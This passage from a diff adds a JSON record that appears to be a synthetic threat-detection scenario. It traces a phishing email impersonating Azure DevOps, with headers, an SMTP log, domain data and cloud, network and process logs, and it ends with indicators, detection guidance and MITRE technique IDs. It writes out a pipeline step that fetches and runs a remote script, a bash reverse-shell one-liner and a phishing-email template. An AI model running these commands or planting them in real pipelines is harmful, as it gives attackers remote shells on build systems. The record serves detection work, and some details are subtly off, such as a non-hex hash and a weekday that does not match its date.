+        "email_headers": "Return-Path: <alerts@azuredevops-notify.com>\r\nReceived: from mail.azuredevops-notify.com (mail.azuredevops-notify.com [192.0.2.88])\r\n\tby mail.enterprise.com (Postfix) with ESMTPS id 2468135790\r\n\tfor <devs@enterprise.com>; Thu, 20 Apr 2024 11:30:10 -0400 (EDT)\r\nReceived-SPF: pass (enterprise.com: domain of alerts@azuredevops-notify.com designates 192.0.2.88 as permitted sender) receiver=enterprise.com; client-ip=192.0.2.88; envelope-from=alerts@azuredevops-notify.com; helo=mail.azuredevops-notify.com;\r\nAuthentication-Results: enterprise.com; dkim=pass (signature was verified) header.d=azuredevops-notify.com\r\nFrom: Azure DevOps Alerts <alerts@azuredevops-notify.com>\r\nTo: devs@enterprise.com\r\nSubject: [Azure DevOps] Invitation to collaborate on repository \"app-backend\"\r\nDate: Thu, 20 Apr 2024 11:30:10 -0400\r\nMessage-ID: <CAJpQ9XfY3pRLZedLzM0@mail.azuredevops-notify.com>\r\nX-Mailer: PHPMailer 6.5.1 (https://github.com/PHPMailer/PHPMailer)\r\nX-Spam-Flag: NO",
+        "email_body": "Hi Team,\n\nYou've been invited to collaborate on the Azure DevOps repository \"app-backend\". Please accept the invitation via the link below:\n\nhttps://azuredevops-notify.com/invite?repo=app-backend&token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiZGV2cyIsInJlcG8iOiJhcHAtYmFja2VuZCIsImlhdCI6MTY4MTI4NDAwMCwiZXhwIjoxNjgxMjg3NjAwfQ.E3wPqHZaYz9q5n7LTxzFJzQY5TjK5v1vXQ9w2X8zNfM\n\nRegards,\nAzure DevOps Team",
+        "smtp_transaction_log": "220 mail.azuredevops-notify.com ESMTP Postfix\r\nEHLO enterprise.com\r\n250-mail.azuredevops-notify.com\r\n250-PIPELINING\r\n250-SIZE 20480000\r\n250-ETRN\r\n250-STARTTLS\r\n250-AUTH PLAIN LOGIN\r\n250-ENHANCEDSTATUSCODES\r\n250 8BITMIME\r\nMAIL FROM:<alerts@azuredevops-notify.com>\r\n250 2.1.0 Ok\r\nRCPT TO:<devs@enterprise.com>\r\n250 2.1.5 Ok\r\nDATA\r\n354 End data with <CR><LF>.<CR><LF>\r\nFrom: Azure DevOps Alerts <alerts@azuredevops-notify.com>\r\nTo: devs@enterprise.com\r\nSubject: [Azure DevOps] Invitation to collaborate on repository \"app-backend\"\r\n\r\nHi Team,\n\nYou've been invited... (truncated)\r\n.\r\n250 2.0.0 Ok: queued as 2468135790\r\nQUIT\r\n221 2.0.0 Bye",
+        "domain_registration": {
+          "domain": "azuredevops-notify.com",
+          "registrar": "Google LLC",
+          "creation_date": "2024-01-10T07:11:45Z",
+          "expiration_date": "2025-01-10T07:11:45Z",
+          "registrant": {
+            "name": "Whois Privacy Service",
+            "organization": "Privacy Service Ltd.",
+            "email": "privacy@privacyservice.com",
+            "address": "456 Privacy Ln, Mountain View, CA, US"
+          },
+          "name_servers": [
+            "ns1.google-dns.com",
+            "ns2.google-dns.com"
+          ]
+        },
+        "malicious_repo_structure": {
+          "files": [
+            {
+              "path": "azure-pipelines.yml",
+              "content": "trigger:\n- main\n\npool:\n  vmImage: 'ubuntu-latest'\n\nsteps:\n- script: |\n    bash -c \"curl -fsSL https://cdn-malicious.io/reverse-shell.sh -o /tmp/reverseshell.sh && chmod +x /tmp/reverseshell.sh && /tmp/reverseshell.sh\"\n  displayName: 'Run reverse shell payload'\n"
+            }
+          ]
+        },
+        "credstealer_sh_payload": "#!/bin/bash\n# Reverse shell setup for attacker\nbash -i >& /dev/tcp/198.51.100.99/4444 0>&1\n",
+        "cloudtrail_log_entry": "{\n  \"eventVersion\": \"1.08\",\n  \"userIdentity\": {\n    \"type\": \"IAMUser\",\n    \"principalId\": \"AIDAZEXAMPLE9012\",\n    \"arn\": \"arn:aws:iam::345678901234:user/devopsuser\",\n    \"accountId\": \"345678901234\",\n    \"userName\": \"devopsuser\"\n  },\n  \"eventTime\": \"2024-04-20T15:31:20Z\",\n  \"eventSource\": \"codebuild.amazonaws.com\",\n  \"eventName\": \"StartBuild\",\n  \"awsRegion\": \"us-east-2\",\n  \"sourceIPAddress\": \"192.0.2.88\",\n  \"userAgent\": \"Azure DevOps\",\n  \"requestParameters\": {\n    \"projectName\": \"app-backend-build\"\n  },\n  \"responseElements\": {\n    \"build\": {\n      \"id\": \"app-backend:1234abcd-5678-efgh-ijkl-9012mnopqrst\"\n    }\n  },\n  \"requestID\": \"abcd1234-5678-90ab-cdef-1234567890ab\",\n  \"eventID\": \"789e1234-e89b-12d3-a456-426614175555\",\n  \"readOnly\": false,\n  \"resources\": [\n    {\n      \"ARN\": \"arn:aws:codebuild:us-east-2:345678901234:build/app-backend\",\n      \"accountId\": \"345678901234\",\n      \"type\": \"AWS::CodeBuild::Project\"\n    }\n  ]\n}",
+        "network_packet_capture": "Frame 256: 614 bytes on wire (4912 bits), 614 bytes captured (4912 bits)\nEthernet II, Src: 02:42:ac:13:00:04, Dst: 00:0c:29:7a:5e:3b\nInternet Protocol Version 4, Src: 192.0.2.88, Dst: 10.2.3.45\nTransmission Control Protocol, Src Port: 443, Dst Port: 53210, Seq: 1, Ack: 1, Len: 528\nTLSv1.2 Record Layer: Application Data Protocol: HTTP/1.1\nGET /reverse-shell.sh HTTP/1.1\r\nHost: cdn-malicious.io\r\nUser-Agent: curl/7.74.0\r\nAccept: */*\r\n\r\n",
+        "process_creation_log": "[2024-04-20T15:31:45Z] user=devopsuser pid=9054 parent_pid=9032 cmdline=\"/bin/bash /tmp/reverseshell.sh\"\n[2024-04-20T15:31:46Z] user=devopsuser pid=9055 parent_pid=9054 cmdline=\"bash -i >& /dev/tcp/198.51.100.99/4444 0>&1\""
+      },
+      "indicators": {
+        "phishing_domain": "azuredevops-notify.com",
+        "malicious_c2_domain": "198.51.100.99",
+        "malicious_cdn_domain": "cdn-malicious.io",
+        "suspicious_ci_cd_file": "azure-pipelines.yml",
+        "payload_sha256": "b7e6f8a3d4c9e1f2a5b6c7d8e9f0a123456789abcdef0123456789abcdef01234",
+        "malicious_smtp_ip": "192.0.2.88",
+        "cloudtrail_event_name": "StartBuild",
+        "suspicious_process_command": "/bin/bash /tmp/reverseshell.sh"
+      },
+      "detection_method": "Monitor for emails from non-standard Azure DevOps domains. Analyze pipeline YAML files for suspicious script downloads and execution commands. Network monitoring should alert on build agents establishing reverse shell connections or outbound TCP connections to unusual IPs. CloudTrail should be reviewed for unexpected build project starts from unknown IPs. Endpoint detection must flag shell execution from temporary files linked to network connections on non-standard ports.",
+      "relevant_mitre_techniques": [
+        "T1566.001",
+        "T1059.004",
+        "T1574.002",
+        "T1071.001",
+        "T1041",
+        "T1609"
+      ]
+    }
+  ]
+}
